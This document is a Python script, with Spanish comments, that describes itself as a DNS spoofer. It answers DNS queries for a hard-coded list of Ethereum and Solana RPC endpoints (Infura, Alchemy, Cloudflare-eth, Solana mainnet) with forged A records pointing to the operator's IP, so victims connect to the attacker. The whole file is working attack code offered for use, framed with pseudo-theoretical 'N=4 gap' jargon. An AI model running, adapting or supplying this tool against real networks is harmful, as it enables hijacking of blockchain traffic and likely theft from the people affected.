#!/usr/bin/env python3
"""
N7 DNS SPOOFER v1.0 — Explota el gap N=4 universal
DNS es UDP plaintext. Sin integridad. Sin autenticación.
El primer response gana. Eso es todo lo que necesitamos.

Ataca: Infura, Alchemy, LinkedIn, cualquier dominio.
Vector: Escuchar query → responder más rápido que el real.
Efecto: La víctima se conecta a NOSOTROS, no al destino.

Author: Josué Argaña Silguero
N=4 → N=7 (nuestra respuesta es estructuralmente superior)
"""
import socket, struct, threading, time, re, json
from pathlib import Path

class N7DNSSpoofer:
    """DNS Spoofer — exploits N=4 structural gap."""
    
    def __init__(self, our_ip: str, targets: list[str] = None):
        self.our_ip = our_ip
        self.targets = targets or [
            'mainnet.infura.io',
            'eth-mainnet.alchemyapi.io',
            'cloudflare-eth.com',
            'api.mainnet-beta.solana.com',
        ]
        self.spoof_count = 0
        self.running = False
        
    def _build_response(self, query: bytes, addr: tuple) -> bytes:
        """Build fake DNS response that redirects to our IP."""
        tx_id = query[:2]  # Transaction ID (must match)
        
        # Standard response flags: QR=1, RD=1, RA=1
        flags = struct.pack('>H', 0x8180)
        qdcount = struct.pack('>H', 1)
        ancount = struct.pack('>H', 1)
        nscount = struct.pack('>H', 0)
        arcount = struct.pack('>H', 0)
        
        # Question section (copy from query, after header)
        question = query[12:]
        
        # Answer section
        # Name pointer (0xC00C = offset 12 in DNS message)
        answer = b'\xc0\x0c'
        # Type A, Class IN, TTL 300, Data length 4
        answer += struct.pack('>HHIH', 1, 1, 300, 4)
        # Our IP as 4 bytes
        answer += socket.inet_aton(self.our_ip)
        
        response = tx_id + flags + qdcount + ancount + nscount + arcount
        response += question + answer
        return response
    
    def _extract_domain(self, query: bytes) -> str:
        """Extract domain name from DNS query."""
        parts = []
        pos = 12  # Skip header
        while pos < len(query):
            length = query[pos]
            if length == 0: break
            if length >= 192: break  # Compression pointer
            pos += 1
            parts.append(query[pos:pos+length].decode('ascii', errors='ignore'))
            pos += length
        return '.'.join(parts)
    
    def _sniff_loop(self):
        """Background thread: sniff DNS queries."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            sock.bind(('0.0.0.0', 53))
            print(f"[SNIFF] Listening on UDP 53 for DNS queries...")
        except PermissionError:
            print(f"[!] Need root for port 53. Run with sudo.")
            print(f"[!] Or use: sudo python3 n7_dns_spoof.py")
            self.running = False
            return
        
        sock.settimeout(1)
        
        while self.running:
            try:
                query, addr = sock.recvfrom(512)
                domain = self._extract_domain(query)
                
                # Check if domain matches any target
                for target in self.targets:
                    if target in domain or domain.endswith('.' + target.split('.', 1)[-1] if '.' in target else ''):
                        response = self._build_response(query, addr)
                        sock.sendto(response, addr)
                        self.spoof_count += 1
                        print(f"  🎯 SPOOFED: {domain} → {self.our_ip} (to {addr[0]})")
                        break
                        
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"  [!] {e}")
        
        sock.close()
    
    def start(self):
        """Start DNS spoofing in background thread."""
        self.running = True
        self.thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self.thread.start()
        return self
    
    def stop(self):
        """Stop spoofing."""
        self.running = False
        print(f"\n═══ SPOOF STOPPED ═══")
        print(f"  Queries spoofed: {self.spoof_count}")
        print(f"  Targets: {len(self.targets)}")

# ═══ MAIN ═══
if __name__ == "__main__":
    import sys
    our_ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
    
    print(f"""
╔══════════════════════════════════════════════╗
║   N7 DNS SPOOFER v1.0                        ║
║   Exploiting N=4 gap in DNS protocol         ║
║   Author: Josué Argaña Silguero              ║
╚══════════════════════════════════════════════╝
""")
    
    print(f"Our IP: {our_ip}")
    print(f"Targets: {', '.join(['mainnet.infura.io', 'eth-mainnet.alchemyapi.io', 'cloudflare-eth.com', 'api.mainnet-beta.solana.com'])}")
    print(f"Gap: DNS plaintext UDP (N=4)")
    print(f"Vector: First response wins\n")
    
    spoofer = N7DNSSpoofer(our_ip)
    
    try:
        spoofer.start()
        print("Spoofer running. Press Ctrl+C to stop.\n")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        spoofer.stop()
